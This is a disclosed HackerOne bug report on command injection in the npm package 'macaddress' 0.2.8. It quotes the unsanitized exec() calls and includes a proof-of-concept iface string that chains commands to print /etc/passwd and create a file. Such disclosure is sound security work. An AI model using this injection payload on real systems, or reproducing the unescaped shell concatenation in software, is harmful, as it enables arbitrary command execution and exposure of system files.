# `macaddress` concatenates unsanitized input into exec() command

## Report Details
- **Report ID**: 319467
- **URL**: https://hackerone.com/reports/319467
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-02-25T05:29:40.739Z
- **Disclosed**: 2018-05-11T20:14:35.387Z

## Reporter
- **Username**: chalker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report code injection in `macaddress`
It allows to inject arbitrary shell commands if the user input can influence the `iface` argument.

# Module

**module name:** macaddress
**version:** 0.2.8
**npm page:** `https://www.npmjs.com/package/macaddress`

## Module Description

> Retrieve MAC addresses in Linux, OS X, and Windows.

## Module Stats

81 238 downloads in the last day
1 632 083 downloads in the last week
7 031 342 downloads in the last month

~84376104 estimated downloads per year [JUST FOR REFERENCE,  ~DOWNLOADS PER MONTH*12]

# Vulnerability

## Vulnerability Description

`(async)  .one(iface, callback) → string` API does not escape or sanitize `iface` argument, and concatenates it to a shell command, passing it to `exec`.

Exact lines:
```
lib/linux.js:4:    exec("cat /sys/class/net/" + iface + "/address", function (err, out) {
lib/macosx.js:4:    exec("networksetup -getmacaddress " + iface, function (err, out) {
lib/unix.js:4:    exec("ifconfig " + iface, function (err, out) {
```

## Steps To Reproduce:

For Linux, use the following example:
```js
let iface = '../../../etc/passwd; touch /tmp/poof; echo ';
require('macaddress').one(iface, function (err, mac) {
  console.log("Mac address for this host: %s", mac);  
});
```

Observe `/etc/passwd` printed into the console, `/tmp/poof` file created.

For other OS, the testcase is similar.

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Execute arbitrary shell commands if that parameter is user-controlled.

## Attachments
No attachments
